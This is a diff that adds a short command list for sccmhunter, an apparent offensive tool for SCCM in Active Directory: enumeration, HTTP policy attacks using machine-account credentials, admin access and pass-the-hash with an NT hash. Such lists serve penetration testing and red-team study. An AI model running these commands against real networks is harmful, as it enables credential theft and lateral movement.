@@ -1,0 +1,10 @@
+sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$TARGET"
+sccmhunter.py find -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP"
+sccmhunter.py smb -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP" -save
+sccmhunter.py http -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP" -auto
+sccmhunter.py http -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -cn "$COMPUTER_NAME" -cp "$COMPUTER_PASSWORD" -dc-ip "$DC_IP"
+sccmhunter.py admin -u "$USERNAME" -p ":$NT_HASH" -ip "$TARGET"
+sccmhunter.py show -smb
+sccmhunter.py show -user
+sccmhunter.py show -computers
+sccmhunter.py show -all
